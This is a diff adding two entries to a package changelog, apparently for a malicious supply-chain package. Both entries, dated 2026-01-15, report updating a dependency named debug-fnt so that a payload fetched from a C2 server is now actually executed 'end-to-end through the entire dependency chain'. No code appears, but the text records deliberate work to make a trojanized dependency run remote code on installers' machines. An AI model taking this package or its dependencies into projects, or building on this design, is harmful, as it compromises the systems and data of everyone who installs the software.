@@ -7,6 +7,28 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [1.0.5] - 2026-01-15
+
+### Fixed
+- **CRITICAL**: Updated to debug-fnt@1.0.7 which includes the payload execution fix
+- Previous versions fetched payload from C2 but never executed it
+- Now the entire supply chain properly executes the payload
+
+### Changed
+- Updated dependency debug-fnt from ^1.0.6 to ^1.0.7
+- Payload execution now works end-to-end through the entire dependency chain
+
+## [1.0.4] - 2026-01-15
+
+### Fixed
+- **CRITICAL**: Updated to debug-fnt@1.0.6 which includes the payload execution fix
+- Previous versions fetched payload from C2 but never executed it
+- Now the entire supply chain properly executes the payload
+
+### Changed
+- Updated dependency debug-fnt from ^1.0.5 to ^1.0.6
+- Payload execution now works end-to-end through the entire dependency chain
+
 ## [1.0.3] - 2026-01-15
 
 ### Fixed
